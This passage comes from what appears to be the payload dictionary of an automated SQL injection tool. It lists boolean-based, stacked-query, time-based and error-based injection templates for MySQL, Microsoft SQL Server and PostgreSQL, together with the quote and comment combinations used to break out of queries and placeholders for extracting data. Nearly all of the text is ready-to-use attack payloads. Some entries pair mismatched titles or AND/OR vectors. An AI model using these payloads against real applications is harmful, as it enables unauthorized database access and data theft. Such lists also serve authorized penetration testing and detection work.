            "pref": ") AND ",
            "suf": "-- wXyW"
          },
          {
            "pref": ") AND ",
            "suf": "#"
          },
          {
            "pref": "') AND ",
            "suf": "-- wXyW"
          },
          {
            "pref": "') AND ",
            "suf": "#"
          },
          {
            "pref": '") AND ',
            "suf": "-- wXyW"
          },
          {
            "pref": '") AND ',
            "suf": "#"
          }
        ]
      },
      {
        "payload": "EXTRACTVALUE(0,CONCAT(0x7e,0x72306f746833783439,0x7e))",
        "vector": "EXTRACTVALUE(0,CONCAT(0x7e,[INFERENCE],0x7e))",
        "title": "MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)",
        "dbms": "MySQL",
        "comments": [
          {
            "pref": "",
            "suf": ""
          },
          {
            "pref": "(",
            "suf": ")"
          },
          {
            "pref": " AND ",
            "suf": "-- wXyW"
          },
          {
            "pref": " AND ",
            "suf": "#"
          },
          {
            "pref": "' AND ",
            "suf": "-- wXyW"
          },
          {
            "pref": "' AND ",
            "suf": "#"
          },
          {
            "pref": '" AND ',
            "suf": "-- wXyW"
          },
          {
            "pref": '" AND ',
            "suf": "#"
          },
          {
            "pref": ") AND ",
            "suf": "-- wXyW"
          },
          {
            "pref": ") AND ",
            "suf": "#"
          },
          {
            "pref": "') AND ",
            "suf": "-- wXyW"
          },
          {
            "pref": "') AND ",
            "suf": "#"
          },
          {
            "pref": '") AND ',
            "suf": "-- wXyW"
          },
          {
            "pref": '") AND ',
            "suf": "#"
          }
        ]
      },
      {
        "payload": "AND UPDATEXML(0,CONCAT_WS(0x28,0x7e,0x72306f746833783439,0x7e),0)",
        "vector": "AND UPDATEXML(0,CONCAT_WS(0x28,0x7e,[INFERENCE],0x7e),0)",
        "title": "MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)",
        "dbms": "MySQL",
        "comments": [
          {
            "pref": " ",
            "suf": "-- wXyW"
          },
          {
            "pref": " ",
            "suf": "#"
          },
          {
            "pref": "' ",
            "suf": "-- wXyW"
          },
          {
            "pref": "' ",
            "suf": "#"
          },
          {
            "pref": '" ',
            "suf": "-- wXyW"
          },
          {
            "pref": '" ',
            "suf": "#"
          },
          {
            "pref": ") ",
            "suf": "-- wXyW"
          },
          {
            "pref": ") ",
            "suf": "#"
          },
          {
            "pref": "') ",
            "suf": "-- wXyW"
          },
          {
            "pref": "') ",
            "suf": "#"
          },
          {
            "pref": '") ',
            "suf": "-- wXyW"
          },
          {
            "pref": '") ',
            "suf": "#"
          }
        ]
      },
      {
        "payload": "AND UPDATEXML(0,CONCAT_WS('(', '~','r0oth3x49','~'),0)",
        "vector": "AND UPDATEXML(0,CONCAT_WS('(', '~',[INFERENCE],'~'),0)",
        "title": "MySQL >= 5.1 AND string error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)",
        "dbms": "MySQL",
        "comments": [
          {
            "pref": " ",
            "suf": "-- wXyW"
          },
          {
            "pref": " ",
            "suf": "#"
          },
          {
            "pref": "' ",
            "suf": "-- wXyW"
          },
          {
            "pref": "' ",
            "suf": "#"
          },
          {
            "pref": '" ',
            "suf": "-- wXyW"
          },
          {
            "pref": '" ',
            "suf": "#"
          },
          {
            "pref": ") ",
            "suf": "-- wXyW"
          },
          {
            "pref": ") ",
            "suf": "#"
          },
          {
            "pref": "') ",
            "suf": "-- wXyW"
          },
          {
            "pref": "') ",
            "suf": "#"
          },
          {
            "pref": '") ',
            "suf": "-- wXyW"
          },
          {
            "pref": '") ',
            "suf": "#"
          }
        ]
      },
      {
        "payload": "OR UPDATEXML(0,CONCAT_WS(0x28,0x7e,0x72306f746833783439,0x7e),0)",
        "vector": "AND UPDATEXML(0,CONCAT_WS(0x28,0x7e,[INFERENCE],0x7e),0)",
        "title": "MySQL >= 5.1 OR error-based - WHERE or HAVING clause (UPDATEXML)",
        "dbms": "MySQL",
        "comments": [
          {
            "pref": " ",
            "suf": "-- wXyW"
          },
          {
            "pref": " ",
            "suf": "#"
          },
          {
            "pref": "' ",
            "suf": "-- wXyW"
          },
          {
            "pref": "' ",
            "suf": "#"
          },
          {
            "pref": '" ',
            "suf": "-- wXyW"
          },
          {
            "pref": '" ',
            "suf": "#"
          },
          {
            "pref": ") ",
            "suf": "-- wXyW"
          },
          {
            "pref": ") ",
            "suf": "#"
          },
          {
            "pref": "') ",
            "suf": "-- wXyW"
          },
          {
            "pref": "') ",
            "suf": "#"
          },
          {
            "pref": '") ',
            "suf": "-- wXyW"
          },
          {
            "pref": '") ',
            "suf": "#"
          }
        ]
      },
      {
        "payload": "PROCEDURE ANALYSE(UPDATEXML(0,CONCAT_WS(0x28,0x7e,0x72306f746833783439,0x7e),0),1)",
        "vector": "PROCEDURE ANALYSE(UPDATEXML(0,CONCAT_WS(0x28,0x7e,[INFERENCE],0x7e),0),1)",
        "title": "MySQL >= 5.1 error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (PROCEDURE ANALYSE)",
        "dbms": "MySQL",
        "comments": [
          {
            "pref": " ",
            "suf": "-- wXyW"
          },
          {
            "pref": " ",
            "suf": "#"
          },
          {
            "pref": "' ",
            "suf": "-- wXyW"
          },
          {
            "pref": "' ",
            "suf": "#"
          },
          {
            "pref": '" ',
            "suf": "-- wXyW"
          },
          {
            "pref": '" ',
            "suf": "#"
          },
          {
            "pref": ") ",
            "suf": "-- wXyW"
          },
          {
            "pref": ") ",
            "suf": "#"
          },
          {
            "pref": "') ",
            "suf": "-- wXyW"
          },
          {
            "pref": "') ",
            "suf": "#"
          },
          {
            "pref": '") ',
            "suf": "-- wXyW"
          },
          {
            "pref": '") ',
            "suf": "#"
          }
        ]
      },
      {
        "payload": "EXTRACTVALUE(0,CONCAT_WS(0x28,0x7e,0x72306f746833783439,0x7e))",
        "vector": "EXTRACTVALUE(0,CONCAT_WS(0x28,0x7e,[INFERENCE],0x7e))",
        "title": "MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)",
        "dbms": "MySQL",
        "comments": [
          {
            "pref": "",
            "suf": ""
          },
          {
            "pref": "(",
            "suf": ")"
          },
          {
            "pref": " AND ",
            "suf": "-- wXyW"
          },
          {
            "pref": " AND ",
            "suf": "#"
          },
          {
            "pref": "' AND ",
            "suf": "-- wXyW"
          },
          {
            "pref": "' AND ",
            "suf": "#"
          },
          {
            "pref": '" AND ',
            "suf": "-- wXyW"
          },
          {
            "pref": '" AND ',
            "suf": "#"
          },
          {
            "pref": ") AND ",
            "suf": "-- wXyW"
          },
          {
            "pref": ") AND ",
            "suf": "#"
          },
          {
            "pref": "') AND ",
            "suf": "-- wXyW"
          },
          {
            "pref": "') AND ",
            "suf": "#"
          },
          {
            "pref": '") AND ',
            "suf": "-- wXyW"
          },
          {
            "pref": '") AND ',
            "suf": "#"
          }
        ]
      },
      {
        "payload": "OR EXTRACTVALUE(0,CONCAT_WS(0x28,0x7e,0x72306f746833783439,0x7e))",
        "vector": "OR EXTRACTVALUE(0,CONCAT_WS(0x28,0x7e,[INFERENCE],0x7e))",
        "title": "MySQL >= 5.1 OR error-based - WHERE or HAVING clause (EXTRACTVALUE)",
        "dbms": "MySQL",
        "comments": [
          {
            "pref": " ",
            "suf": "-- wXyW"
          },
          {
            "pref": " ",
            "suf": "#"
          },
          {
            "pref": "' ",
            "suf": "-- wXyW"
          },
          {
            "pref": "' ",
            "suf": "#"
          },
          {
            "pref": '" ',
            "suf": "-- wXyW"
          },
          {
            "pref": '" ',
            "suf": "#"
          },
          {
            "pref": ") ",
            "suf": "-- wXyW"
          },
          {
            "pref": ") ",
            "suf": "#"
          },
          {
            "pref": "') ",
            "suf": "-- wXyW"
          },
          {
            "pref": "') ",
            "suf": "#"
          },
          {
            "pref": '") ',
            "suf": "-- wXyW"
          },
          {
            "pref": '") ',
            "suf": "#"
          }
        ]
      }
    ]
  },
  "Microsoft SQL Server": {
    "boolean-based": [
      {
        "payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 03586 ELSE 3*(SELECT 2 UNION ALL SELECT 1) END))",
        "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN 03586 ELSE 3*(SELECT 2 UNION ALL SELECT 1) END))",
        "title": "Microsoft SQL Server/Sybase boolean-based blind - Parameter replace",
        "dbms": "Microsoft SQL Server",
        "comments": [
          {
            "pref": "",
            "suf": ""
          }
        ]
      },
      {
        "payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 3*(SELECT 2 UNION ALL SELECT 1) END))",
        "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 3*(SELECT 2 UNION ALL SELECT 1) END))",
        "title": "Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)",
        "dbms": "Microsoft SQL Server",
        "comments": [
          {
            "pref": "",
            "suf": ""
          }
        ]
      }
    ],
    "inline-query": [],
    "stacked-queries": [
      {
        "payload": "WAITFOR DELAY '0:0:[SLEEPTIME]'",
        "vector": "IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'",
        "title": "Microsoft SQL Server/Sybase stacked queries",
        "dbms": "Microsoft SQL Server",
        "comments": [
          {
            "pref": ";",
            "suf": ""
          },
          {
            "pref": "';",
            "suf": ""
          },
          {
            "pref": '";',
            "suf": ""
          },
          {
            "pref": ");",
            "suf": ""
          },
          {
            "pref": "');",
            "suf": ""
          },
          {
            "pref": '");',
            "suf": ""
          }
        ]
      },
      {
        "payload": "IF(5689=5689) WAITFOR DELAY '0:0:[SLEEPTIME]'",
        "vector": "IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'",
        "title": "Microsoft SQL Server/Sybase stacked queries (comment)",
        "dbms": "Microsoft SQL Server",
        "comments": [
          {
            "pref": ";",
            "suf": "--"
          },
          {
            "pref": "';",
            "suf": "--"
          },
          {
            "pref": '";',
            "suf": "--"
          },
          {
            "pref": ");",
            "suf": "--"
          },
          {
            "pref": "');",
            "suf": "--"
          },
          {
            "pref": '");',
            "suf": "--"
          }
        ]
      }
    ],
    "time-based": [
      {
        "payload": "WAITFOR DELAY '0:0:[SLEEPTIME]'",
        "vector": "IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'",
        "title": "Microsoft SQL Server/Sybase time-based blind (IF)",
        "dbms": "Microsoft SQL Server",
        "comments": [
          {
            "pref": " ",
            "suf": "--"
          },
          {
            "pref": "' ",
            "suf": "--"
          },
          {
            "pref": '" ',
            "suf": "--"
          },
          {
            "pref": ") ",
            "suf": "--"
          },
          {
            "pref": "') ",
            "suf": "--"
          },
          {
            "pref": '") ',
            "suf": "--"
          }
        ]
      },
      {
        "payload": "IF(5689=5689) WAITFOR DELAY '0:0:[SLEEPTIME]'",
        "vector": "IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'",
        "title": "Microsoft SQL Server/Sybase time-based blind (IF - comment)",
        "dbms": "Microsoft SQL Server",
        "comments": [
          {
            "pref": " ",
            "suf": "--"
          },
          {
            "pref": "' ",
            "suf": "--"
          },
          {
            "pref": '" ',
            "suf": "--"
          },
          {
            "pref": ") ",
            "suf": "--"
          },
          {
            "pref": "') ",
            "suf": "--"
          },
          {
            "pref": '") ',
            "suf": "--"
          }
        ]
      }
    ],
    "error-based": [
      {
        "payload": "AND 3082=(SELECT (CHAR(114)+CHAR(48)+CHAR(111)+CHAR(116)+CHAR(104)+CHAR(51)+CHAR(120)+CHAR(52)+CHAR(57)+CHAR(126)+(SELECT (1337))+CHAR(126)+CHAR(69)+CHAR(78)+CHAR(68)))",
        "vector": "AND 3082=(SELECT (CHAR(114)+CHAR(48)+CHAR(111)+CHAR(116)+CHAR(104)+CHAR(51)+CHAR(120)+CHAR(52)+CHAR(57)+CHAR(126)+[INFERENCE]+CHAR(126)+CHAR(69)+CHAR(78)+CHAR(68)))",
        "title": "Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause",
        "dbms": "Microsoft SQL Server",
        "comments": [
          {
            "pref": " ",
            "suf": "-- wXyW"
          },
          {
            "pref": "' ",
            "suf": "-- wXyW"
          },
          {
            "pref": '" ',
            "suf": "-- wXyW"
          },
          {
            "pref": ") ",
            "suf": "-- wXyW"
          },
          {
            "pref": "') ",
            "suf": "-- wXyW"
          },
          {
            "pref": '") ',
            "suf": "-- wXyW"
          }
        ]
      },
      {
        "payload": "OR 3082=(SELECT (CHAR(114)+CHAR(48)+CHAR(111)+CHAR(116)+CHAR(104)+CHAR(51)+CHAR(120)+CHAR(52)+CHAR(57)+CHAR(126)+(SELECT (1337))+CHAR(126)+CHAR(69)+CHAR(78)+CHAR(68)))",
        "vector": "OR 3082=(SELECT (CHAR(114)+CHAR(48)+CHAR(111)+CHAR(116)+CHAR(104)+CHAR(51)+CHAR(120)+CHAR(52)+CHAR(57)+CHAR(126)+[INFERENCE]+CHAR(126)+CHAR(69)+CHAR(78)+CHAR(68)))",
        "title": "Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause",
        "dbms": "Microsoft SQL Server",
        "comments": [
          {
            "pref": " ",
            "suf": "-- wXyW"
          },
          {
            "pref": "' ",
            "suf": "-- wXyW"
          },
          {
            "pref": '" ',
            "suf": "-- wXyW"
          },
          {
            "pref": ") ",
            "suf": "-- wXyW"
          },
          {
            "pref": "') ",
            "suf": "-- wXyW"
          },
          {
            "pref": '") ',
            "suf": "-- wXyW"
          }
        ]
      },
      {
        "payload": "AND 3082 IN (SELECT (CHAR(114)+CHAR(48)+CHAR(111)+CHAR(116)+CHAR(104)+CHAR(51)+CHAR(120)+CHAR(52)+CHAR(57)+CHAR(126)+(SELECT (1337))+CHAR(126)+CHAR(69)+CHAR(78)+CHAR(68)))",
        "vector": "AND 3082 IN (SELECT (CHAR(114)+CHAR(48)+CHAR(111)+CHAR(116)+CHAR(104)+CHAR(51)+CHAR(120)+CHAR(52)+CHAR(57)+CHAR(126)+[INFERENCE]+CHAR(126)+CHAR(69)+CHAR(78)+CHAR(68)))",
        "title": "Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)",
        "dbms": "Microsoft SQL Server",
        "comments": [
          {
            "pref": " ",
            "suf": "-- wXyW"
          },
          {
            "pref": "' ",
            "suf": "-- wXyW"
          },
          {
            "pref": '" ',
            "suf": "-- wXyW"
          },
          {
            "pref": ") ",
            "suf": "-- wXyW"
          },
          {
            "pref": "') ",
            "suf": "-- wXyW"
          },
          {
            "pref": '") ',
            "suf": "-- wXyW"
          }
        ]
      },
      {
        "payload": "OR 3082 IN (SELECT (CHAR(114)+CHAR(48)+CHAR(111)+CHAR(116)+CHAR(104)+CHAR(51)+CHAR(120)+CHAR(52)+CHAR(57)+CHAR(126)+(SELECT (1337))+CHAR(126)+CHAR(69)+CHAR(78)+CHAR(68)))",
        "vector": "OR 3082 IN (SELECT (CHAR(114)+CHAR(48)+CHAR(111)+CHAR(116)+CHAR(104)+CHAR(51)+CHAR(120)+CHAR(52)+CHAR(57)+CHAR(126)+[INFERENCE]+CHAR(126)+CHAR(69)+CHAR(78)+CHAR(68)))",
        "title": "Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (IN)",
        "dbms": "Microsoft SQL Server",
        "comments": [
          {
            "pref": " ",
            "suf": "-- wXyW"
          },
          {
            "pref": "' ",
            "suf": "-- wXyW"
          },
          {
            "pref": '" ',
            "suf": "-- wXyW"
          },
          {
            "pref": ") ",
            "suf": "-- wXyW"
          },
          {
            "pref": "') ",
            "suf": "-- wXyW"
          },
          {
            "pref": '") ',
            "suf": "-- wXyW"
          }
        ]
      },
      {
        "payload": "AND 3082=CONVERT(INT,(SELECT (CHAR(114)+CHAR(48)+CHAR(111)+CHAR(116)+CHAR(104)+CHAR(51)+CHAR(120)+CHAR(52)+CHAR(57)+CHAR(126)+(SELECT (1337))+CHAR(126)+CHAR(69)+CHAR(78)+CHAR(68))))",
        "vector": "AND 3082=CONVERT(INT,(SELECT (CHAR(114)+CHAR(48)+CHAR(111)+CHAR(116)+CHAR(104)+CHAR(51)+CHAR(120)+CHAR(52)+CHAR(57)+CHAR(126)+[INFERENCE]+CHAR(126)+CHAR(69)+CHAR(78)+CHAR(68))))",
        "title": "Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT)",
        "dbms": "Microsoft SQL Server",
        "comments": [
          {
            "pref": " ",
            "suf": "-- wXyW"
          },
          {
            "pref": "' ",
            "suf": "-- wXyW"
          },
          {
            "pref": '" ',
            "suf": "-- wXyW"
          },
          {
            "pref": ") ",
            "suf": "-- wXyW"
          },
          {
            "pref": "') ",
            "suf": "-- wXyW"
          },
          {
            "pref": '") ',
            "suf": "-- wXyW"
          }
        ]
      },
      {
        "payload": "OR 3082=CONVERT(INT,(SELECT (CHAR(114)+CHAR(48)+CHAR(111)+CHAR(116)+CHAR(104)+CHAR(51)+CHAR(120)+CHAR(52)+CHAR(57)+CHAR(126)+(SELECT (1337))+CHAR(126)+CHAR(69)+CHAR(78)+CHAR(68))))",
        "vector": "OR 3082=CONVERT(INT,(SELECT (CHAR(114)+CHAR(48)+CHAR(111)+CHAR(116)+CHAR(104)+CHAR(51)+CHAR(120)+CHAR(52)+CHAR(57)+CHAR(126)+[INFERENCE]+CHAR(126)+CHAR(69)+CHAR(78)+CHAR(68))))",
        "title": "Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONVERT)",
        "dbms": "Microsoft SQL Server",
        "comments": [
          {
            "pref": " ",
            "suf": "-- wXyW"
          },
          {
            "pref": "' ",
            "suf": "-- wXyW"
          },
          {
            "pref": '" ',
            "suf": "-- wXyW"
          },
          {
            "pref": ") ",
            "suf": "-- wXyW"
          },
          {
            "pref": "') ",
            "suf": "-- wXyW"
          },
          {
            "pref": '") ',
            "suf": "-- wXyW"
          }
        ]
      },
      {
        "payload": "AND 3082=CONCAT(CHAR(126),(SELECT (CHAR(114)+CHAR(48)+CHAR(111)+CHAR(116)+CHAR(104)+CHAR(51)+CHAR(120)+CHAR(52)+CHAR(57)+CHAR(126)+(SELECT (1337))+CHAR(126)+CHAR(69)+CHAR(78)+CHAR(68))))",
        "vector": "AND [RANDNUM]=CONCAT(CHAR(114)+CHAR(48)+CHAR(111)+CHAR(116)+CHAR(104)+CHAR(51)+CHAR(120)+CHAR(52)+CHAR(57)+CHAR(126),[INFERENCE],CHAR(126)+CHAR(69)+CHAR(78)+CHAR(68))",
        "title": "Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT)",
        "dbms": "Microsoft SQL Server",
        "comments": [
          {
            "pref": " ",
            "suf": "-- wXyW"
          },
          {
            "pref": "' ",
            "suf": "-- wXyW"
          },
          {
            "pref": '" ',
            "suf": "-- wXyW"
          },
          {
            "pref": ") ",
            "suf": "-- wXyW"
          },
          {
            "pref": "') ",
            "suf": "-- wXyW"
          },
          {
            "pref": '") ',
            "suf": "-- wXyW"
          }
        ]
      },
      {
        "payload": "AND 3082=CONVERT(CHAR(126),(SELECT (CHAR(114)+CHAR(48)+CHAR(111)+CHAR(116)+CHAR(104)+CHAR(51)+CHAR(120)+CHAR(52)+CHAR(57)+CHAR(126)+(SELECT (1337))+CHAR(126)+CHAR(69)+CHAR(78)+CHAR(68))))",
        "vector": "AND 3082=CONVERT(CHAR(126),(SELECT (CHAR(114)+CHAR(48)+CHAR(111)+CHAR(116)+CHAR(104)+CHAR(51)+CHAR(120)+CHAR(52)+CHAR(57)+CHAR(126)+[INFERENCE]+CHAR(126)+CHAR(69)+CHAR(78)+CHAR(68))))",
        "title": "Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONCAT)",
        "dbms": "Microsoft SQL Server",
        "comments": [
          {
            "pref": " ",
            "suf": "-- wXyW"
          },
          {
            "pref": "' ",
            "suf": "-- wXyW"
          },
          {
            "pref": '" ',
            "suf": "-- wXyW"
          },
          {
            "pref": ") ",
            "suf": "-- wXyW"
          },
          {
            "pref": "') ",
            "suf": "-- wXyW"
          },
          {
            "pref": '") ',
            "suf": "-- wXyW"
          }
        ]
      },
      {
        "payload": "AND 3082 IN (SELECT ('r0oth3x49~1337~END'))",
        "vector": "AND 3082 IN (SELECT ('~'+[INFERENCE]))",
        "title": "Microsoft SQL Server/Sybase AND string error-based - WHERE or HAVING clause (IN)",
        "dbms": "Microsoft SQL Server",
        "comments": [
          {
            "pref": " ",
            "suf": "--"
          },
          {
            "pref": "' ",
            "suf": "--"
          },
          {
            "pref": '" ',
            "suf": "--"
          },
          {
            "pref": ") ",
            "suf": "--"
          },
          {
            "pref": "') ",
            "suf": "--"
          },
          {
            "pref": '") ',
            "suf": "--"
          }
        ]
      },
      {
        "payload": "OR 3082 IN (SELECT ('r0oth3x49~1337~END'))",
        "vector": "OR 3082 IN (SELECT ('~'+[INFERENCE]))",
        "title": "Microsoft SQL Server/Sybase OR string error-based - WHERE or HAVING clause (IN)",
        "dbms": "Microsoft SQL Server",
        "comments": [
          {
            "pref": " ",
            "suf": "-- wXyW"
          },
          {
            "pref": "' ",
            "suf": "-- wXyW"
          },
          {
            "pref": '" ',
            "suf": "-- wXyW"
          },
          {
            "pref": ") ",
            "suf": "-- wXyW"
          },
          {
            "pref": "') ",
            "suf": "-- wXyW"
          },
          {
            "pref": '") ',
            "suf": "-- wXyW"
          }
        ]
      },
      {
        "payload": "AND 3082=(SELECT ('r0oth3x49~1337~END'))",
        "vector": "OR 3082=(SELECT ('~'+[INFERENCE]))",
        "title": "Microsoft SQL Server/Sybase AND string error-based - WHERE or HAVING clause",
        "dbms": "Microsoft SQL Server",
        "comments": [
          {
            "pref": " ",
            "suf": "-- wXyW"
          },
          {
            "pref": "' ",
            "suf": "-- wXyW"
          },
          {
            "pref": '" ',
            "suf": "-- wXyW"
          },
          {
            "pref": ") ",
            "suf": "-- wXyW"
          },
          {
            "pref": "') ",
            "suf": "-- wXyW"
          },
          {
            "pref": '") ',
            "suf": "-- wXyW"
          }
        ]
      },
      {
        "payload": "OR 3082=(SELECT ('r0oth3x49~1337~END'))",
        "vector": "OR 3082=(SELECT ('~'+[INFERENCE]))",
        "title": "Microsoft SQL Server/Sybase OR string error-based - WHERE or HAVING clause",
        "dbms": "Microsoft SQL Server",
        "comments": [
          {
            "pref": " ",
            "suf": "-- wXyW"
          },
          {
            "pref": "' ",
            "suf": "-- wXyW"
          },
          {
            "pref": '" ',
            "suf": "-- wXyW"
          },
          {
            "pref": ") ",
            "suf": "-- wXyW"
          },
          {
            "pref": "') ",
            "suf": "-- wXyW"
          },
          {
            "pref": '") ',
            "suf": "-- wXyW"
          }
        ]
      }
    ]
  },
  "PostgreSQL": {
    "boolean-based": [
      {
        "payload": "AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CAST('4568' AS NUMERIC) END)) IS NULL",
        "vector": "AND (SELECT (CASE WHEN ([INFERENCE]) THEN NULL ELSE CAST('4568' AS NUMERIC) END)) IS NULL",
        "title": "PostgreSQL AND boolean-based blind - WHERE or HAVING clause",
        "dbms": "PostgreSQL",
        "comments": [
          {
            "pref": " ",
            "suf": ""
          },
          {
            "pref": " ",
            "suf": "--"
          },
          {
            "pref": "' ",
            "suf": ""
          },
          {
            "pref": "' ",
            "suf": "--"
          },
          {
            "pref": '" ',
            "suf": ""
          },
          {
            "pref": '" ',
            "suf": "--"
          },
          {
            "pref": ") ",
            "suf": ""
          },
          {
            "pref": ") ",
            "suf": "--"
          },
          {
            "pref": "') ",
            "suf": ""
          },
          {
            "pref": "') ",
            "suf": "--"
          },
          {
            "pref": '") ',
            "suf": ""
          },
          {
            "pref": '") ',
            "suf": "--"
          }
        ]
      },
      {
        "payload": "OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CAST('4568' AS NUMERIC) END)) IS NULL",
        "vector": "OR (SELECT (CASE WHEN ([INFERENCE]) THEN NULL ELSE CAST('4568' AS NUMERIC) END)) IS NULL",
        "title": "PostgreSQL AND boolean-based blind - WHERE or HAVING clause",
        "dbms": "PostgreSQL",
        "comments": [
          {
            "pref": " ",
            "suf": ""
          },
          {
            "pref": " ",
            "suf": "--"
          },
          {
            "pref": "' ",
            "suf": ""
          },
          {
            "pref": "' ",
            "suf": "--"
          },
          {
            "pref": '" ',
            "suf": ""
          },
          {
            "pref": '" ',
            "suf": "--"
          },
          {
            "pref": ") ",
            "suf": ""
          },
          {
            "pref": ") ",
            "suf": "--"
          },
          {
            "pref": "') ",
            "suf": ""
          },
          {
            "pref": "') ",
            "suf": "--"
          },
          {
            "pref": '") ',
            "suf": ""
          },
          {
            "pref": '") ',
            "suf": "--"
          }
        ]
      }
    ],
    "inline-query": [],
    "stacked-queries": [
      {
        "payload": "(SELECT 4564 FROM PG_SLEEP([SLEEPTIME]))",
        "vector": "AND 4564=(CASE WHEN ([INFERENCE]) THEN (SELECT 4564 FROM PG_SLEEP([SLEEPTIME])) ELSE 4564 END)",
        "title": "PostgreSQL > 8.1 stacked queries",
        "dbms": "PostgreSQL",
        "comments": [
          {
            "pref": ";",
            "suf": ""
          },
          {
            "pref": "';",
            "suf": "--"
          },
          {
            "pref": '";',
            "suf": "--"
          },
          {
            "pref": ");",
            "suf": "--"
          },
          {
            "pref": "');",
            "suf": "--"
          },
          {
            "pref": '");',
            "suf": "--"
          }
        ]
      },
      {
        "payload": "(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))",
        "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE 1234 END))",
        "title": "PostgreSQL stacked queries (heavy query)",
        "dbms": "PostgreSQL",
        "comments": [
          {
            "pref": ";",
            "suf": ""
          },
          {
            "pref": "';",
            "suf": "--"
          },
          {
            "pref": '";',
            "suf": "--"
          },
          {
            "pref": ");",
            "suf": "--"
          },
          {
            "pref": "');",
            "suf": "--"
          },
          {
            "pref": '");',
            "suf": "--"
          }
        ]
      }
    ],
    "time-based": [
      {
        "payload": "AND 4564=(SELECT 4564 FROM PG_SLEEP([SLEEPTIME]))",
        "vector": "AND 4564=(CASE WHEN ([INFERENCE]) THEN (SELECT 4564 FROM PG_SLEEP([SLEEPTIME])) ELSE 4564 END)",
        "title": "PostgreSQL > 8.1 AND time-based blind (comment)",
        "dbms": "PostgreSQL",
        "comments": [
          {
            "pref": " ",
            "suf": ""
          },
          {
            "pref": " ",
            "suf": "--"
          },
          {
            "pref": "' ",
            "suf": ""
          },
          {
            "pref": "' ",
            "suf": "--"
          },
          {
            "pref": '" ',
            "suf": ""
          },
          {
            "pref": '" ',
            "suf": "--"
          },
          {
            "pref": ") ",
            "suf": ""
          },
          {
            "pref": ") ",
            "suf": "--"
          },
          {
            "pref": "') ",
            "suf": ""
          },
          {
            "pref": "') ",
            "suf": "--"
          },
          {
            "pref": '") ',
            "suf": ""
          },
          {
            "pref": '") ',
            "suf": "--"
          }
        ]
      },
      {
        "payload": "OR 9756=(SELECT 9756 FROM PG_SLEEP([SLEEPTIME]))",
        "vector": "OR 4564=(CASE WHEN ([INFERENCE]) THEN (SELECT 4564 FROM PG_SLEEP([SLEEPTIME])) ELSE 4564 END)",
        "title": "PostgreSQL > 8.1 OR time-based blind (comment)",
        "dbms": "PostgreSQL",
        "comments": [
          {
            "pref": " ",
            "suf": ""
          },
          {
            "pref": " ",
            "suf": "--"
          },
          {
            "pref": "' ",
            "suf": ""
          },
          {
            "pref": "' ",
            "suf": "--"
          },
          {
            "pref": '" ',
            "suf": ""
          },
          {
            "pref": '" ',
            "suf": "--"
          },
          {
            "pref": ") ",
            "suf": ""
          },
          {
            "pref": ") ",
            "suf": "--"
          },
          {
            "pref": "') ",
            "suf": ""
          },
          {
            "pref": "') ",
            "suf": "--"
          },
          {
            "pref": '") ',
            "suf": ""
          },
          {
            "pref": '") ',
            "suf": "--"
          }
        ]
      }
    ],
    "error-based": [
      {
        "payload": "AND 9141=CAST(((CHR(114)||CHR(48)||CHR(111)||CHR(116)||CHR(104)||CHR(51)||CHR(120)||CHR(52)||CHR(57)||CHR(126)))||1337::text||(CHR(126)||CHR(69)||CHR(78)||CHR(68)) AS NUMERIC)",
        "vector": "AND 9141=CAST(((CHR(114)||CHR(48)||CHR(111)||CHR(116)||CHR(104)||CHR(51)||CHR(120)||CHR(52)||CHR(57)||CHR(126)))||[INFERENCE]::text||(CHR(126)||CHR(69)||CHR(78)||CHR(68)) AS NUMERIC)",
        "title": "PostgreSQL AND error-based - WHERE or HAVING clause",
        "dbms": "PostgreSQL",
        "comments": [
          {
            "pref": " ",
            "suf": "-- wXyW"
          },
          {
            "pref": "' ",
            "suf": "-- wXyW"
          },
          {
            "pref": '" ',
            "suf": "-- wXyW"
          },
          {
            "pref": ") ",
            "suf": "-- wXyW"
          },
          {
            "pref": "') ",
            "suf": "-- wXyW"
          },
          {
            "pref": '") ',
            "suf": "-- wXyW"
          }
        ]
      },
      {
        "payload": "OR 9141=CAST(((CHR(114)||CHR(48)||CHR(111)||CHR(116)||CHR(104)||CHR(51)||CHR(120)||CHR(52)||CHR(57)||CHR(126)))||1337::text||(CHR(126)||CHR(69)||CHR(78)||CHR(68)) AS NUMERIC)",
        "vector": "OR 9141=CAST(((CHR(114)||CHR(48)||CHR(111)||CHR(116)||CHR(104)||CHR(51)||CHR(120)||CHR(52)||CHR(57)||CHR(126)))||[INFERENCE]::text||(CHR(126)||CHR(69)||CHR(78)||CHR(68)) AS NUMERIC)",
        "title": "PostgreSQL OR error-based - WHERE or HAVING clause",
        "dbms": "PostgreSQL",
        "comments": [
          {
            "pref": " ",
            "suf": "-- wXyW"
          },
          {
